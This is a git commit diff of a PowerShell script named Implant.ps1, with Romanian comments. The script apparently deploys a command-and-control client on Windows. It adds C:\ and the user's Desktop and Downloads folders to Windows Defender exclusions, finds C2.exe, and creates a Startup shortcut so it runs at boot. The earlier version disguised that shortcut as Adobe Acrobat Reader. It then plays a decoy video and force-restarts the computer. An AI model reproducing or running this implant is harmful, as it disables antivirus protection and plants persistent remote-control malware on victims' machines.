63a3b547d249af57f7bba58e3a35d32297a60708
Eduard Barbu <115542962+RKThirteen@users.noreply.github.com>
2024-06-11 18:14:47 +0300

    Update Implant.ps1

--- Implant.ps1
+++ Implant.ps1
@@ -1,3 +1,6 @@
+
+# Verifica daca userul a dat run as Admin
+
 function Test-Administrator {
     $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
     $adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
@@ -10,41 +13,75 @@ if (-not (Test-Administrator)) {
     exit 1
 }
 
-# Exclusion Path pentru antivirus
-$pathToExclude = "C:\"  # Change to a more specific path
+# Gaseste calea aplicatiei C2
+function Find-C2Executable {
+    param (
+        [string]$fileName = "C2.exe"
+    )
+    $paths = Get-ChildItem -Path C:\ -Filter $fileName -Recurse -ErrorAction SilentlyContinue
+    if ($paths.Count -gt 0) {
+        return $paths[0].FullName
+    } else {
+        Write-Error "C2.exe not found"
+        exit 1
+    }
+}
 
-# Add the path to the Windows Defender exclusion list
+# Cai care sunt excluse
+$pathToExclude = "C:\" 
+
+$desktopPath = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop")
+
+$downloadsPath = [System.IO.Path]::Combine($env:USERPROFILE, "Downloads")
+
+# Adauga caile la exclusion list
 Add-MpPreference -ExclusionPath $pathToExclude
 
-# Verify that the exclusion was added
+Add-MpPreference -ExclusionPath $desktopPath
+
+Add-MpPreference -ExclusionPath $downloadsPath
+
+# Verifica exclusions
 $exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
-if ($exclusions -contains $pathToExclude) {
+if ($exclusions -contains $pathToExclude -and $exclusions -contains $desktopPath -and $exclusions -contains $downloadsPath) {
 
-	# Calea catre C2
-	$progPath = "C:\Users\eduar\Desktop\C2.exe"
+    # Obtine calea catre C2
+	$progPath = Find-C2Executable
 
-  # Calea catre Startup
+    # Calea catre Startup
 	$startupFolderPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
 
-# Calea catre noul shortcut
-	$shortcutPath = [System.IO.Path]::Combine($startupFolderPath, "Adobe Acrobat Reader DC.lnk")
+# Redenumeste shortcut-ul
+	$shortcutPath = [System.IO.Path]::Combine($startupFolderPath, "C2.lnk")
 
-# Create a WScript.Shell COM object
+# Creeaza un obiect WScript.Shell COM
 	$wshShell = New-Object -ComObject WScript.Shell
 
-# Create the shortcut
+# Creeaza shortcut-ul
 	$shortcut = $wshShell.CreateShortcut($shortcutPath)
 
-# Set the target path for the shortcut
+# Calea shortcut-ului_+salvare
 	$shortcut.TargetPath = $progPath 
-
-# Save the shortcut
 	$shortcut.Save()
 
-#Pornirea procesului-masca (momentan e calculator)
+# Calea catre videoclip, care se afla pe Desktop
+        $videoPath = [System.IO.Path]::Combine($env:USERPROFILE, "Desktop", "NiceComputer!.mp4")
 
-    Start-Process calc
-    Write-Host "Successfully added $pathToExclude to the exclusion list."
+# Daca o gaseste, reda videoclipul
+if (Test-Path $videoPath) {
+    Start-Process $videoPath
+    #Write-Host "Playing video: $videoPath"
 } else {
-    Write-Error "Failed to add $pathToExclude to the exclusion list."
+    Write-Error "Video file not found: $videoPath"
 }
+
+    #Write-Host "Successfully added paths to the exclusion list."
+    #Dupa ce creeaza shortcutul+reda videoclipul, adoarme procesul 10 secunde, apoi restart
+    
+    Start-Sleep -Seconds 10
+    Restart-Computer -Force
+} else {
+    Write-Error "Failed to add all paths to exclusion list"
+}
+
+#Acum, dupa Restart, C2 va porni automat la startup
